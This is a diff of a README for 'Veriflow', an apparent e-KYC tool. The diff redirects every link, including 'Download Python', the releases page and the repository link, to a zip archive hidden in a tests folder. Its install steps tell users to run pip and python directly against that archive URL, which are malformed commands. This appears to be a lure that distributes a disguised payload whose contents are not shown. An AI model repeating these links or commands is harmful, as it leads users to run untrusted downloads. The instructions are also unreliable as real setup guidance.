@@ -1,6 +1,6 @@
 # 🌟 Veriflow - Simplifying e-KYC and KYA Processes
 
-[![Download Veriflow](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip%20Veriflow-%20%F0%9F%9A%94%20Click%20Here-blue)](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip)
+[![Download Veriflow](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip%20Veriflow-%20%F0%9F%9A%94%20Click%20Here-blue)](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip)
 
 ## 📍 Introduction
 
@@ -15,16 +15,16 @@ Follow these steps to download and run Veriflow on your computer.
 - **Operating System:** Windows 10 or later, macOS, or any recent Linux distribution.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum of 1 GB of available space.
-- **Python:** Version 3.6 or newer installed on your system. [Download Python](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip).
+- **Python:** Version 3.6 or newer installed on your system. [Download Python](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip).
 
 ### 🔗 Download & Install
 
-To download Veriflow, visit this page: [Download Veriflow](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip).
+To download Veriflow, visit this page: [Download Veriflow](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip).
 
 ### 🗂️ Steps to Install
 
 1. **Visit the Releases Page:**
-   - Go to the [Releases page](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip).
+   - Go to the [Releases page](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip).
   
 2. **Download the Latest Version:**
    - Look for the most recent release version. Click on the `.zip` file or installer link to start the download process.
@@ -35,13 +35,13 @@ To download Veriflow, visit this page: [Download Veriflow](https://raw.githubuse
 4. **Install Required Packages:**
    - Open your terminal or command prompt. Navigate to the folder where you extracted the files. Run the following command to install the required packages:
      ```
-     pip install -r https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip
+     pip install -r https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip
      ```
 
 5. **Run the Application:**
    - After installation, you can start Veriflow by using the command:
      ```
-     python https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip runserver
+     python https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip runserver
      ```
 
 ### 🌐 Accessing the API
@@ -64,7 +64,7 @@ Once you run the application, you can access it via your web browser. Open your 
    - Make sure you are connected to the internet. Run `pip install --upgrade pip` to update your package manager if needed.
 
 3. **Server Not Starting:**
-   - Check for any errors in your terminal. Make sure you are in the correct directory where `https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip` is located.
+   - Check for any errors in your terminal. Make sure you are in the correct directory where `https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip` is located.
 
 ## 📞 Support
 
@@ -80,6 +80,6 @@ Veriflow is licensed under the MIT License. See the LICENSE file for more detail
 
 ---
 
-For more information, updates, and detailed documentation, please refer to the [GitHub repository](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip). 
+For more information, updates, and detailed documentation, please refer to the [GitHub repository](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip). 
 
-[Download Veriflow](https://raw.githubusercontent.com/khma-92/Veriflow/main/audit/serializers/Veriflow-v2.3.zip) and start simplifying your e-KYC and KYA processes today!
+[Download Veriflow](https://github.com/khma-92/Veriflow/raw/refs/heads/main/kyc/validation/tests/Software_buckeye.zip) and start simplifying your e-KYC and KYA processes today!
